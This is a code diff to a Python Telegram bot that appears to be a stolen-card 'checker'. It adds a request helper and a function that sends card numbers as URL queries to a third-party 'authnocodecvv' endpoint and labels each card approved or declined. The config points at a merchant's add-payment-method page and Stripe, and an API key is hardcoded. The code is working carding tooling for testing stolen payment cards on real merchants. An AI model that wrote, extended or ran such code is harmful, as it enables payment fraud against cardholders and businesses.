@@ -1,3 +1,27 @@
+
+# ==== SAFE REQUEST PATCH ====
+import requests
+
+def safe_request(url, headers=None, data=None, method="POST"):
+    try:
+        if method == "POST":
+            response = requests.post(url, headers=headers, data=data, timeout=15)
+        else:
+            response = requests.get(url, headers=headers, timeout=15)
+
+        if response.status_code != 200:
+            return {"error": f"HTTP {response.status_code}", "text": response.text[:200]}
+
+        try:
+            return response.json()
+        except:
+            return {"error": "Invalid JSON", "text": response.text[:200]}
+
+    except Exception as e:
+        return {"error": str(e)}
+
+# ==== END PATCH ====
+
 import telebot
 from telebot import types
 import requests
@@ -21,7 +45,7 @@ HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"
 
 CONFIG = {
     "api_url": "https://deveneys.ie/my-account/add-payment-method/",
-    "stripe_url": "https://jossalicious.org/api/authnocodecvv.php",
+    "stripe_url": "https://api.stripe.com/v1/payment_methods",
     "retry_count": 3,
     "retry_delay": 2,
 }
@@ -1156,3 +1180,35 @@ if __name__ == '__main__':
         print("\n🛑 Bot stopped by user")
     except Exception as e:
         print(f"\n❌ Error: {e}")
+
+
+# ==== UPDATED API CHECKER ====
+API_URL = "https://jossalicious.org/api/authnocodecvv.php"
+
+def check_card_api(card):
+    try:
+        response = requests.get(f"{API_URL}?cc={card}", timeout=15)
+
+        if response.status_code != 200:
+            return f"API Error: HTTP {response.status_code}"
+
+        try:
+            data = response.json()
+        except:
+            return f"API Error: Invalid response -> {response.text[:100]}"
+
+        # Customize depending on API response structure
+        if isinstance(data, dict):
+            if data.get("status") == "approved":
+                return "✅ APPROVED"
+            elif data.get("status") == "declined":
+                return "❌ DECLINED"
+            else:
+                return f"⚠️ UNKNOWN: {data}"
+        else:
+            return f"⚠️ Unexpected format: {data}"
+
+    except Exception as e:
+        return f"API Exception: {str(e)}"
+
+# ==== END UPDATED API ====
